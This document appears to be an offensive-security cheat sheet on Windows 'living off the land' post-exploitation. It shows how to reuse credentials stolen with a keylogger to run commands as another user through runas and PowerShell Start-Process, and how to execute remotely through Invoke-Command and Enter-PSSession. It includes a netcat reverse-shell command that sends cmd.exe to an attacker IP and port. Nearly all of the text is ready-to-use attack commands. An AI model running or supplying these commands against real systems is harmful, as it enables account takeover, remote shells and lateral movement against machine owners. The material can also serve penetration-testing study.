# Living off the Land

## 01 - Command Prompt

Now let's say you have activated a keylogger to monitor the user's keyboard activities and you have got the credentials. Now you want to use credentials as an Administrator or a different user account and it might ask you a password prompt to do so since it was configured without the autologin that was modified in the registry editor.

```
C:\> cmd /c <password> | runas [/profile] /user:<DOMAIN_NAME>\<username> cmd.exe
```

## 02 - Powershell

- Another method is using powershell to supply with the defined variables and execute with a powershell cmdlet `Start-Process`.

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process -FilePath C:\path\to\shell.exe -NoNewWindow -Credential $credential -WorkingDirectory C:\Users\Public
```

- If you have `netcat` that you want to execute that might contain arguments.

```powershell
PS C:\> Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("<attacker_IP>","<attacker_PORT>","-e","cmd.exe") -WorkingDirectory C:\Users\Public
```

- You can also execute it remotely.

```powershell
PS C:\> $password = ConvertTo-SecureString "<password>" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential("<username>", $password)
$computer = "<IP>"
[System.Diagnostics.Process]::Start("<Commands>", $credential.Username, $credential.Password, $computer)
```

- Syntax using the `Start-Process`:

```
PS C:\> Start-Process <commands> -ArgumentList (<arg_1>,<arg_2>, <arg_n>) -Verb RunAs

PS C:\> Start-Process cmd.exe -ArgumentList ("/c", "echo", "yes") -Verb RunAs
```

- Using the `-NoNewWindow` flag that some programs may open it with a window pop up.

```
PS C:\> Start-Process cmd.exe -NoNewWindow -ArgumentList ("/c", "echo", "yes") -verb runas
```

- Or you can remotely authenticate a network shared workstation to interact even further when you need to

```
PS C:\> invoke-command -computer <IP> -credential $credential -scriptblock { <commands> }

PS C:\> Enter-PSSession -ComputerName <IP>
```